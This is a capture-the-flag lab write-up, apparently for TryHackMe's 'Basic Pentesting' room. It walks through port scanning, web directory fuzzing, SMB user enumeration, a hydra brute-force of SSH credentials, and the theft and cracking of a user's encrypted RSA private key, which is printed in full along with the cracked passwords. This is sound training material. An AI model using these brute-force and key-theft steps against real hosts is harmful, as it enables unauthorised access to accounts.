# Basic Pentesting

## Questions

![image.png](images/image.png)

![image.png](images/image%201.png)

## Port Enumeration

We can first find out all the opening port first

```bash
root@ip-xx-xx-xx-xx:~# rustscan -a xx.xx.xxx.xxx --ulimit 5000 -r 1-65535 --
.
.
.
Open xx.xx.xxx.xxx:22
Open xx.xx.xxx.xxx:80
Open xx.xx.xxx.xxx:139
Open xx.xx.xxx.xxx:445
Open xx.xx.xxx.xxx:8009
Open xx.xx.xxx.xxx:8080
.
.
.
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
8009/tcp open  ajp13        syn-ack
8080/tcp open  http-proxy   syn-ack
```

We can then run a detailed scan on those ports

```bash
root@ip-xx-xx-xx-xx:~#  nmap -sV -sC basic.thm -p 22,80,139,445,8009,8080
.
.
.
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-06T08:25:18
|_  start_date: N/A
```

To sum up, the opening ports are:

- Port `22`: SSH
- Port `80`, `8080`: HTTP
- Port `139`, `445`: [NetBIOS](https://en.wikipedia.org/wiki/NetBIOS)
- Port `8009`: [Apache JServ Protocol](https://en.wikipedia.org/wiki/Apache_JServ_Protocol)

### Research

I am unfamiliar with NetBIOS and Apache JServ Protocol, so I did some research:

**NetBIOS**

- Stands for Network Basic Input/Output System
- Allow computers to communicate on a LAN
- Exploitable, according to [Hackvisor](https://hackviser.com/tactics/pentesting/services/netbios)

**Apache JServ Protocol**

- A proxy to handle inbound requests
- According to Wikipedia, AJP should not be exposed, which probably means that it is highly exploitable

> AJP is a highly trusted protocol and should never be exposed to untrusted clients, which could use it to gain access to sensitive information or execute code on the application server.
> 

These two services might be exploitable, which is worth a try

## HTTP(Port 80)

Seem nothing at all

![image.png](images/image%202.png)

However, under the source code, there is a comment that draws our attention to the dev note section

![image.png](images/image%203.png)

I guess we need to enumerate, so I use `ffuf` to do the job, and there is a directory called `development`

```bash
root@ip-xx-xx-xx-xx:~# ffuf -u http://basic.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://basic.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 274, Words: 20, Lines: 10]
development             [Status: 301, Size: 312, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 158, Words: 20, Lines: 11]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10]
:: Progress: [4655/4655] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

We can navigate to there and find two text file

![image.png](images/image%204.png)

Content of `dev.txt`

> 2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm
using version 2.5.12, because other versions were giving me trouble. -K
> 
> 
> 2018-04-22: SMB has been configured. -K
> 
> 2018-04-21: I got Apache set up. Will put in our content later. -J
> 

Content of `j.txt`

> For J:
> 
> 
> I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
> and I was able to crack your hash really easily. You know our password policy, so please follow
> it? Change that password ASAP.
> 
> - K

Struts is an Apache framework for web applications. I found an [exploit](https://www.exploit-db.com/exploits/42627), which does not help me this time.

However, it is actually a rabbit hole. I cheated a bit here and watched [John Hammond’s video](https://youtu.be/xl2Xx5YOKcI?si=l9K6ttfJnsTGxwop), and found out that we can use `enum4linux` to enumerate information from a Linux machine

To do that, we can use a command like this: `enum4linux -a basic.thm > test.log`, which the `-a` will try all simple enumerations, and then reading the log, I found there are two users

```bash
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
S-1-22-1-1002 Unix User\ubuntu (Local User)
```

If you look at `j.txt`, you will realize that the `j` resembles `jan` , while `k` for `kay`, so we can now try to brute force the password of `jan`

```bash
root@ip-xx-xx-xx-xx:~# hydra -l jan -P /usr/share/wordlists/rockyou.txt basic.thm ssh -t 4
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-06 09:19:31
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://basic.thm:22/
[22][ssh] host: basic.thm   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found

```

After a very long time, I get the password: `armando`

## SSH (Port 22)

After logging in through SSH, there is a `.lesshst` file. It is a file that stores the history of `less`, unfortunately, we have no privilege to read it.

`rw------- 1 root jan    47 Apr 23  2018 .lesshst`

We also do not have any sudo privileges

```bash
jan@ip-xx-xx-xxx-xxx:~$ sudo -l
[sudo] password for jan: 
Sorry, user jan may not run sudo on ip-xx-xx-xxx-xxx.
```

However, we can try to navigate to kay’s home directory, and we will see there are more files

```bash
jan@ip-xx-xx-xxx-xxx:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Jan  6 03:20 ..
-rw------- 1 kay  kay   789 Jun 22  2025 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@ip-xx-xx-xxx-xxx:/home/kay$ cat .bash_history 
cat: .bash_history: Permission denied
jan@ip-xx-xx-xxx-xxx:/home/kay$ cat pass.bak
cat: pass.bak: Permission denied
```

if we navigate to `.ssh` directory, we will see that all files are readable

```bash
jan@ip-xx-xx-xxx-xxx:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
jan@ip-xx-xx-xxx-xxx:/home/kay/.ssh$ 
```

So we can read the private key

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----
```

However if we use the private directly, it will prompt us the password. Which we don’t know

```bash
root@ip-xx-xx-xx-xx:~# ssh kay@basic.thm -i id_rsa
Enter passphrase for key 'id_rsa': 
```

To solve this, we need to use a tool called `ssh2john`, we can do that by simply using `ssh2john id_rsa > hash`, it will convert the private key to a format that is readable to john, a hash cracker

Now we can use john to crack the hash, and we get the password `beeswax`

![image.png](images/image%205.png)

Now we can enter the password with the private key to log in

```bash
root@ip-xx-xx-xx-xx:~# ssh kay@basic.thm -i id_rsa
Enter passphrase for key 'id_rsa': 
.
.
.
kay@ip-xx-xx-xxx-xxx:~$ 

```

And we get the final password: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

```bash
kay@ip-xx-xx-xxx-xxx:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

With the final password discovered, we have finished all the questions.
